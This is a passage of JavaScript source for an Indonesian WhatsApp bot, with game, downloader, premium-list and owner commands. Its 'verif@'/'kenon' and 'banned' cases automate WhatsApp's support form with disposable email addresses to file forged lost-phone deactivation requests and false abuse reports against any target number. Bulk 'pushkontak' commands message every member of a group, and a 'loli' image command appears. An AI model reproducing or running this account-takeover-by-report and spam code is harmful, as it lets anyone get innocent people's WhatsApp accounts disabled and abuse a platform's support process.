txt += `*🐇Kelinci* : ${i.kelinci}\n`
txt += `*🐑Domba* : ${i.domba}\n`
txt += `*🐄Sapi* : ${i.sapi}\n`
txt += `*🐘Gajah* : ${i.gajah}\n\n`
}
 reply(txt)
}
 break
//========================================================================//
case 'mining': case 'mine':{
if (!isInventory){ addInventori(m.sender) }
if (isCekDarah < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
conn.sendMessage(m.chat, { image: { url: './database/base/image/tambang.jpg' }, caption: caption }, { quoted: m })
}, 7000)
setTimeout( () => {
reply(`${pushname} Mulai Menambang`)
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
}
break
        case 'sell': case 'jual':{
 if (!q) reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(sender, anu)
 let monaynya = 1500 * anu
 addMonay(sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(sender)}\n*Sisa Ikan Mu:* ${getIkan(sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(sender, anu)
 let monaynya = 2500 * anu
 addMonay(sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(sender)}\n*Sisa Ayam Mu:* ${getAyam(sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Domba Mu:* ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
}, 2000) 
 } else { reply("Incorrect Format!") }
 }
 break
//========================================================================//
 case 'heal':{
 if (!isCekDarah < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return reply('Darahmu Masih Full')
 if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 reply('Success! Darahmu Full Kembali')
 }
 break
//========================================================================//
 case 'toanime': case 'jadianime': {
     if (global.db.data.users[m.sender].limit < 5) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
 if (skizo == "YOUR_APIKEY") return m.reply('Buat dulu apikeynya sendiri di https://skizo.tech/pricing, tenang aja ada yang bayar ada yang gratis juga kok\nlalu masukin ke setting.js')
if (isBan) return errorReply('Lu di ban kocak awokwok') 
if (!q) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
conn.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const media = await conn.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
conn.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/toanime?url=${anu}&apikey=${skizo}` }, caption: 'Done Jadi Anime Ayangg >///<'}, { quoted: m})
conn.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
}
        reply('_1 Limit Terpakai ✔️_')
break
//=================================================/
case "createqr": {
const qrcode = require('qrcode')
    if (!text) return errorReply(`Penggunaan Salah Harusnya ${prefix+command} isi kata bebas`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
conn.sendMessage(from, { image: data, caption: `Sukses Kak` }, { quoted: yuk })
}
break
case "detectqr": {
try {
mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
const res = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res.json() 

m.reply(util.format(data[0].symbol[0].data))
} catch (err) {
m.reply(util.format(data.type))
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break
        case 'pppanjang': case 'setppbot2':{
if (isBan) return errorReply('Lu di ban kocak awokwok') 
if (!isCreator) return errorReply('Fitur Khusus owner!')
if (!quoted) return errorReply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return errorReply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return errorReply(`Reply foto dgn caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
reply("Done!!!")
}
break
   case 'ffstalk':{
if (!q) return errorReply(`Example ${prefix+command} 946716486`)
reply('tunggu sebentar kaka')
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'pushcontid':{
if (!isCreator) return errorReply(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await conn.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
conn.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;

//=================================================//
case 'pushkontak':{
if (!isCreator) return errorReply(mess.owner)
if (!m.isGroup) return errorReply(`di group coy`)
if (!text) return errorReply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
conn.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case  'myip':
            case 'ipbot':
                if (!isCreator) return errorReply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
                break
                
                case 'getcase':
if (!isCreator) return errorReply('Fitur ini cuman buat Owner bot!')
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("main.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCase(q)}`)
break
//=================================================//
case 'public': {
if (!isCreator) return errorReply(mess.owner)
conn.public = true
reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return errorReply(mess.owner)
conn.public = false
reply('Sukses Change To Self')
}
break
//=================================================//

        case 'addprem':
if (!isCreator) return errorReply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6285730672259`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/base/dbnye/premium.json', JSON.stringify(prem))
reply(`The Number ${prrkek} Has Been Premium!`)
break
//=================================================//

 case 'delprem':
if (!isCreator) return errorReply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/base/dbnye/premium.json', JSON.stringify(prem))
reply(`The Number ${ya} Has Been Removed Premium!`)
break
//=================================================//

        case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let conn of prem) {
teks += `- ${conn}\n`
}
teks += `\n*Total : ${prem.length}*`
conn.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: fkontak , contextInfo: { "mentionedJid": prem } })
break
//=================================================//
case 'pengguna':  {
if (!isCreator) return errorReply(mess.owner)
if (!args[0]) return reply(`*Contoh : ${command} add 62345678910*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*Pengguna Ini telah Di Ban*')
banned.push(orgnye)
reply(`Succes ban Pengguna Ini`)
} else if (args[0] === "del") {
if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
} else {
reply("Error")
}
}
break
        case 'git': case 'gitclone':
        if (global.db.data.users[m.sender].limit < 10) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 10
     if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/kkreyuk/file`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply('error om :<'))
        reply('_10 Limit Terpakai_')
break
    case 'hd': case 'remini': {
               if (global.db.data.users[m.sender].limit < 10) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 10
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			await loading()
		
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			try {
			conn.sendMessage(m.chat, { image: proses, caption: 'success'}, { quoted: m})
			
			} catch (error) {
			m.reply("gagal")
			}
  // tangani kesalahan untuk semua case di sini
}
        reply('_10 Limit Terpakai ✔️_')
			break
    
//=================================================//
      case 'paptt':
            if (!isPrem && !isCreator) return errorReply (mess.prem)
            if (!q) return errorReply(`Example ${prefix + command} foto/video`)
            let papttfoto = JSON.parse(fs.readFileSync('./database/foto.json'))
            let papttvideo = JSON.parse(fs.readFileSync('./database/video.json'))
            let sagne = (pickRandom(papttfoto))
            let sange = (pickRandom(papttvideo))
            if (q == 'foto') {
                conn.sendMessage(m.chat, { image: { url: sagne }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            } else if (q == 'video') {
                conn.sendMessage(m.chat, { video: { url: sange }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            }
        break
    
    case 'listban':
if (isBan) return errorReply('*Lu Di Ban Owner*')
 teksooop = `*List Ban*\n\n`
for (let ii of banned) {
teksooop += `- ${ii}\n`
}
reply(teksooop)
break
        case 'autosticker':
if (!isCreator) return errorReply(mess.owner)
if (args[0] == 'on') {
if (autosticker) return reply('*Activated!*')
autosticker = true
reply('*Successfully Activated Autosticker*')
} else if (args[0] == 'off') {
if (!autosticker) return reply('*Not Yet Active!*')
autosticker = false
reply('*Successfully Turn off Autosticker*')
} else {
reply(`Type .autosticker on To Activate And .autosticker off To Deactivate`)
}
break
        case 'autostickergc':
            case 'autosticker':
if (!m.isGroup) return errorReply('khusus grup om')
if (!isBotAdmins) return errorReply('bot bukan atmin')
if (!isAdmins && !isCreator) return errorReply('atmin')
if (args.length < 1) return reply('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return reply(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
reply('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
reply('auto sticker deactivated')
}
break
//=================================================//
case 'owner': case 'krey':{

 conn.sendContact(from, global.owner, fkontak)
    
}
break
case 'waonwer': case 'whatsapp':{
await loading()
 conn.sendContact(from, global.owner, m)
}
break
case "infobot": 
 reply(`*Hi ${pushname}*

「 *BOT INFO* 」
⭔Nama Creator : *${ownername}*
⭔Nomor Creator : *${owner}*
⭔Group Official : *${gr}*
⭔Nama Script : ${global.botname}
⭔Daftar User :*${("id", db_user).length}*
⭔Versi Bot : *1.0.0*
⭔Botz Name : *${global.botname}*
⭔Nomor Bot : ${m.sender.split`@`[0]}
⭔Type Baileys : *Case*
⭔Source Code : *Linux*
⭔Uptime : ⏳ *${runtime(process.uptime())}*

▭▬▭▬▭▬▭▬▭▬▭▬▭▬
Powered By *${ownername}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`)

break
    /*case 'tiktok': case 'tt': case 'tiktokvideo': case 'ttvideo':{ 
  if (global.db.data.users[m.sender].limit < 10) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 10    
if (!text) return errorReply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return errorReply(`Link Invalid!!`)
reply(`Tunggu sebentar ya kakak:>`)
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break*/
        case 'tiktokk':
case 'ttt': {
  if (!text) return reply(`Contoh: ${prefix + command} link`);
      try {
reply(mess.wait)
require('./lib/tiktok').Tiktok(text).then( data => {
const ttcp = `👤 *Author*: ${data.author}\n📑 *Title*: ${data.title}\n\n©${botname}`
conn.sendMessage(m.chat, { caption: ttcp, video: { url: data.watermark }}, {quoted:m})
})
} catch (error) {
     const data = await fetchJson(`https://itzpire.com/download/tiktok?url=${encodeURIComponent(text)}&type=v2`);

const caption = `┈──────────────────────⫺
            *ㄒ丨ҜㄒㄖҜ         丨几千ㄖ*
┈──────────────────────⫺
*Author*: ${data.data.author.nickname}
*Like*: ${data.data.statistics.likeCount}
*Komentar*: ${data.data.statistics.commentCount}
*Share*: ${data.data.statistics.shareCount}
*Title*: ${data.data.desc}

_Download By ${global.botname}_`;
const vidnya = data.data.video;
conn.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
}
}
break;
    case 'tiktokaudio': case 'ttaudio': case 'ttsong': {
        if (global.db.data.users[m.sender].limit < 5) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
if (!text) return errorReply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return errorReply(`Link Invalid!!`)
reply(`Tunggu sebentar ya kakak:>`)
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
        reply('_5 Limit Terpakai ✔️_')
break
        //anime
        case 'waifu':{
            if (global.db.data.users[m.sender].limit < 5) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await conn.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
        reply('_5 Limit Terpakai ✔️_')
break
        case 'loli': {
reply(mess.wait)
conn.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/randomimganime/loli`}, caption: `*Tich Dasar pedo*`})
}
break
//=================================================
case 'verif@': case 'kenon': {
if (!isCreator) return errorReply(mess.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Hai,

 Terima kasih atas pesan Anda.

 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.

 Selama periode penonaktifan:

 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke

 akun akan tetap dalam status tertunda hingga 30 hari.

 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai

 secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit

 kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang

 pulihkan riwayat obrolan Anda di: Android |  iPhone.

 file, cadangan, atau riwayat panggilan dari akun yang dihapus.

 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media

 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.

 Sumber daya terkait:

 ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.

 ⚫ Pelajari tentang akun yang dicuri di artikel ini.

 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'banned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I noticed that a user was using modified whatsapp, so i ask support to ban this account for violating terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Silakan tunggu selama 1-24 jam untuk proses pemblokiran dari bot, dan harap tunggu beberapa saat untuk melihat balasan email dari WhatsApp. 🙏`)
await loading(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbanned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
